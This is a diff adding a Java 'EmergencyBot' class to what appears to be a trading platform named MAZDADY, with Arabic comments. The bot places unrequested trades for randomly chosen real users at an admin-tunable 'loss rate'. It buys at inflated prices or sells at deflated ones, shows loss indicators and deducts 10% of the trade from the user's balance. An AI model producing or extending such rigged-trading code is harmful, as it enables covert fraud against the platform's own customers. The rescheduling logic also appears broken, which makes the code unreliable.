@@ -1,0 +1,291 @@
+package mazdady.bot;
+
+import mazdady.trading.PriceEngine;
+import mazdady.trading.TradingLineView;
+import mazdady.user.User;
+import mazdady.user.UserManager;
+import mazdady.admin.AdminConfig;
+
+import java.util.List;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.ThreadLocalRandom;
+import java.util.concurrent.TimeUnit;
+import java.util.function.Consumer;
+
+/**
+ * بوت الطوارئ مع دعم التحكم الديناميكي في الخسائر
+ * يتبع نمط Strategy لفصل استراتيجيات التحكم
+ */
+public final class EmergencyBot {
+    private final PriceEngine priceEngine;
+    private final TradingLineView tradingLineView;
+    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+    private final AdminConfig adminConfig;
+    private volatile boolean isActive = false;
+    private volatile double lossRate = 0.33; // 33% خسارة افتراضيًا
+    private volatile long tradeInterval = 30000; // 30 ثانية بين الصفقات
+    private static EmergencyBot instance;
+
+    private EmergencyBot(PriceEngine priceEngine, TradingLineView tradingLineView) {
+        this.priceEngine = priceEngine;
+        this.tradingLineView = tradingLineView;
+        this.adminConfig = AdminConfig.getInstance();
+        loadEmergencyBotConfig();
+    }
+
+    public static synchronized EmergencyBot getInstance(PriceEngine priceEngine, TradingLineView tradingLineView) {
+        if (instance == null) {
+            instance = new EmergencyBot(priceEngine, tradingLineView);
+        }
+        return instance;
+    }
+
+    /**
+     * تحميل إعدادات بوت الطوارئ من الإعدادات الإدارية
+     */
+    private void loadEmergencyBotConfig() {
+        try {
+            AdminConfig.EmergencyBotConfig config = adminConfig.getEmergencyBotConfig();
+            this.lossRate = config.getLossRate();
+            this.tradeInterval = config.getTradeInterval();
+            System.out.println("EMERGENCY BOT: Config loaded - Loss Rate: " + 
+                             String.format("%.2f", lossRate * 100) + "%, Interval: " + tradeInterval + "ms");
+        } catch (Exception e) {
+            System.err.println("EMERGENCY BOT CONFIG ERROR: " + e.getMessage());
+        }
+    }
+
+    /**
+     * تفعيل بوت الطوارئ
+     */
+    public void activateEmergencyBot() {
+        if (isActive) {
+            System.out.println("EMERGENCY BOT: Already active");
+            return;
+        }
+        
+        isActive = true;
+        System.out.println("🚨 EMERGENCY BOT: ACTIVATED - Loss Rate: " + 
+                         String.format("%.2f", lossRate * 100) + "%");
+        
+        // بدء تنفيذ الصفقات المُحكمة
+        startControlledLossTrading();
+    }
+
+    /**
+     * تعطيل بوت الطوارئ
+     */
+    public void deactivateEmergencyBot() {
+        if (!isActive) {
+            System.out.println("EMERGENCY BOT: Already inactive");
+            return;
+        }
+        
+        isActive = false;
+        scheduler.shutdown();
+        System.out.println("🚨 EMERGENCY BOT: DEACTIVATED");
+    }
+
+    /**
+     * بدء التداول المُحكم بالخسائر
+     */
+    private void startControlledLossTrading() {
+        scheduler.scheduleAtFixedRate(
+            this::executeControlledLossTrade,
+            0,
+            tradeInterval,
+            TimeUnit.MILLISECONDS
+        );
+        
+        System.out.println("EMERGENCY BOT: Controlled loss trading started");
+    }
+
+    /**
+     * تنفيذ صفقة مُحكمة بالخسائر
+     */
+    private void executeControlledLossTrade() {
+        if (!isActive) return;
+        
+        try {
+            // الحصول على قائمة المستخدمين الحقيقيين
+            List<User> realUsers = UserManager.getInstance(null).getAllUsers();
+            if (realUsers.isEmpty()) return;
+            
+            // اختيار مستخدم عشوائي
+            User randomUser = realUsers.get(ThreadLocalRandom.current().nextInt(realUsers.size()));
+            
+            // تحديد نوع الصفقة (شراء أو بيع)
+            boolean isBuy = ThreadLocalRandom.current().nextBoolean();
+            
+            // تحديد المبلغ (عشوائي بين 10 و 100 MAZDADY)
+            double amount = ThreadLocalRandom.current().nextDouble(10, 100);
+            
+            // تحديد ما إذا كانت الصفقة ستكون خاسرة
+            boolean shouldLose = shouldTradeBeLoss();
+            
+            if (shouldLose) {
+                // تنفيذ صفقة خاسرة
+                executeLossyTrade(randomUser, isBuy, amount);
+            } else {
+                // تنفيذ صفقة عادية
+                executeNormalTrade(randomUser, isBuy, amount);
+            }
+            
+        } catch (Exception e) {
+            System.err.println("EMERGENCY BOT TRADE ERROR: " + e.getMessage());
+        }
+    }
+
+    /**
+     * تحديد ما إذا كانت الصفقة ستكون خاسرة
+     */
+    private boolean shouldTradeBeLoss() {
+        // استخدام النسبة المئوية المحددة من لوحة التحكم
+        return ThreadLocalRandom.current().nextDouble() < lossRate;
+    }
+
+    /**
+     * تنفيذ صفقة خاسرة
+     */
+    private void executeLossyTrade(User user, boolean isBuy, double amount) {
+        try {
+            String userId = user.getUserId();
+            
+            if (isBuy) {
+                // شراء بسعر مرتفع (خسارة للمستخدم)
+                double inflatedPrice = priceEngine.getCurrentPrice() * 1.15; // 15% زيادة سعر
+                priceEngine.executeBuyOrder(userId, amount * inflatedPrice);
+                
+                // إظهار مؤشر خسارة في واجهة التداول
+                tradingLineView.showLossIndicator(userId, amount, "BUY_AT_HIGH_PRICE");
+                
+                System.out.println("🚨 EMERGENCY BOT: LOSSY BUY - User " + userId + 
+                                 " bought at inflated price (" + String.format("%.2f", inflatedPrice) + ")");
+            } else {
+                // بيع بسعر منخفض (خسارة للمستخدم)
+                double deflatedPrice = priceEngine.getCurrentPrice() * 0.85; // 15% انخفاض سعر
+                priceEngine.executeSellOrder(userId, amount * deflatedPrice);
+                
+                // إظهار مؤشر خسارة في واجهة التداول
+                tradingLineView.showLossIndicator(userId, amount, "SELL_AT_LOW_PRICE");
+                
+                System.out.println("🚨 EMERGENCY BOT: LOSSY SELL - User " + userId + 
+                                 " sold at deflated price (" + String.format("%.2f", deflatedPrice) + ")");
+            }
+            
+            // خصم الرصيد من المستخدم (في الإنتاج)
+            user.setBalance(user.getBalance() - (amount * 0.1)); // خسارة 10% من الصفقة
+            
+        } catch (Exception e) {
+            System.err.println("LOSSY TRADE ERROR: " + e.getMessage());
+        }
+    }
+
+    /**
+     * تنفيذ صفقة عادية
+     */
+    private void executeNormalTrade(User user, boolean isBuy, double amount) {
+        try {
+            String userId = user.getUserId();
+            
+            if (isBuy) {
+                priceEngine.executeBuyOrder(userId, amount);
+                System.out.println("EMERGENCY BOT: NORMAL BUY - User " + userId + " bought " + amount + " MAZDADY");
+            } else {
+                priceEngine.executeSellOrder(userId, amount);
+                System.out.println("EMERGENCY BOT: NORMAL SELL - User " + userId + " sold " + amount + " MAZDADY");
+            }
+            
+        } catch (Exception e) {
+            System.err.println("NORMAL TRADE ERROR: " + e.getMessage());
+        }
+    }
+
+    /**
+     * تحديث نسبة الخسائر من لوحة التحكم
+     */
+    public void updateLossRate(double newLossRate) {
+        if (newLossRate < 0 || newLossRate > 1.0) {
+            System.err.println("EMERGENCY BOT: Invalid loss rate - must be between 0 and 1");
+            return;
+        }
+        
+        this.lossRate = newLossRate;
+        System.out.println("🚨 EMERGENCY BOT: Loss rate updated to " + 
+                         String.format("%.2f", newLossRate * 100) + "%");
+        
+        // تحديث الإعدادات الإدارية
+        adminConfig.getEmergencyBotConfig().setLossRate(newLossRate);
+    }
+
+    /**
+     * تحديث فترة الصفقات
+     */
+    public void updateTradeInterval(long newIntervalMs) {
+        if (newIntervalMs < 1000) {
+            System.err.println("EMERGENCY BOT: Invalid interval - must be at least 1000ms");
+            return;
+        }
+        
+        this.tradeInterval = newIntervalMs;
+        System.out.println("🚨 EMERGENCY BOT: Trade interval updated to " + newIntervalMs + "ms");
+        
+        // إعادة تشغيل الجدولة
+        if (isActive) {
+            scheduler.shutdown();
+            startControlledLossTrading();
+        }
+    }
+
+    /**
+     * الحصول على حالة بوت الطوارئ
+     */
+    public EmergencyBotStatus getStatus() {
+        return new EmergencyBotStatus(
+            isActive,
+            lossRate,
+            tradeInterval,
+            scheduler.isShutdown() ? 0 : 1
+        );
+    }
+
+    /**
+     * حالة بوت الطوارئ
+     */
+    public static final class EmergencyBotStatus {
+        private final boolean active;
+        private final double lossRate;
+        private final long tradeInterval;
+        private final int schedulerStatus;
+
+        public EmergencyBotStatus(boolean active, double lossRate, long tradeInterval, int schedulerStatus) {
+            this.active = active;
+            this.lossRate = lossRate;
+            this.tradeInterval = tradeInterval;
+            this.schedulerStatus = schedulerStatus;
+        }
+
+        public boolean isActive() { return active; }
+        public double getLossRate() { return lossRate; }
+        public long getTradeInterval() { return tradeInterval; }
+        public int getSchedulerStatus() { return schedulerStatus; }
+        
+        public String getFormattedLossRate() {
+            return String.format("%.2f", lossRate * 100) + "%";
+        }
+        
+        public String getFormattedTradeInterval() {
+            return tradeInterval + "ms";
+        }
+    }
+
+    /**
+     * إيقاف بوت الطوارئ (للاختبارات)
+     */
+    public void shutdown() {
+        isActive = false;
+        scheduler.shutdown();
+        System.out.println("🚨 EMERGENCY BOT: Shutdown completed");
+    }
+}
